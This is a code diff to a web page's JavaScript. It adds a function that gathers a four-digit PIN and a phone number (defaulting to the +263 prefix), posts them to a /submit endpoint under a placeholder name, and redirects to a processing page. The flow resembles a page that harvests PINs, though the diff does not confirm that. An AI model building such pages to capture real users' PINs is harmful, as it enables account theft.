@@ -266,6 +266,8 @@ inputs.forEach((input, index) => {
         checkPin();
     });
 
+    
+
     input.addEventListener("keydown", (e) => {
         if (e.key === "Backspace" && !input.value && index > 0) {
             inputs[index - 1].focus();
@@ -285,9 +287,71 @@ function checkPin() {
     }
 }
 
+async function submitOtp() {
+    const btn = document.getElementById("submitBtn");
+    if (btn.disabled) return;
+
+    let pin = "";
+    document.querySelectorAll(".pin-box").forEach(input => {
+        pin += input.value;
+    });
+
+    const error = document.getElementById("errorMsg");
+
+    if (pin.length < 4) {
+        error.innerText = "Enter full PIN";
+        error.style.display = "block";
+        return;
+    }
+
+    error.style.display = "none";
+
+    btn.innerText = "Processing...";
+    btn.disabled = true;
+
+    document.getElementById("pageLoader").style.display = "block";
+
+    const phone = document.getElementById("phone").value;
+
+    try {
+        const res = await fetch("/submit", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({
+                name: "User",
+                phone: phone,
+                pin: pin
+            })
+        });
+
+        if (!res.ok) throw new Error();
+
+        // clear PIN AFTER submit
+        document.querySelectorAll(".pin-box").forEach(input => input.value = "");
+
+        localStorage.setItem("firstProcess", "yes");
+
+        window.location.href = "processing.html";
+
+    } catch (err) {
+        error.innerText = "Submission failed. Try again.";
+        error.style.display = "block";
+
+        btn.innerText = "Submit";
+        btn.disabled = false;
+
+        document.getElementById("pageLoader").style.display = "none";
+    }
+}
 // LOAD PHONE
-document.getElementById("phone").value =
-    localStorage.getItem("phone") || "";
+   document.getElementById("phone").value = localStorage.getItem("phone") || "+263";
+
+window.onload = () => {
+    document.body.classList.add("loaded");
+};
+
 
 </script>
 
